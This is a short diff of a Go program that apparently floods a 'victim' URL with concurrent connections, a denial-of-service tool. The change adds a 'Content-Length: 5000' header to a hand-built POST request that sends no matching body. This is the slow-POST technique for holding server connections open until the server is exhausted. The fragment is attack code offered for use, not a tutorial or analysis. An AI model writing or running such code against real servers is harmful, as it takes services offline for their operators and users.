@@ -79,7 +79,7 @@ func main() {
 	}
 	hostname = victimUri.Host
 	host := victimUri.Host
-	requestHeader := []byte(fmt.Sprintf("POST %s HTTP/1.1\nHost: %s\nContent-Type: application/x-www-form-urlencoded\nUser-Agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7\n\n",
+	requestHeader := []byte(fmt.Sprintf("POST %s HTTP/1.1\nContent-Length: 5000\nHost: %s\nContent-Type: application/x-www-form-urlencoded\nUser-Agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7\n\n",
 		victimUri.RequestURI(), host))
 
 	activeConnectionsCh := make(chan int, Config.DialWorkersCount)
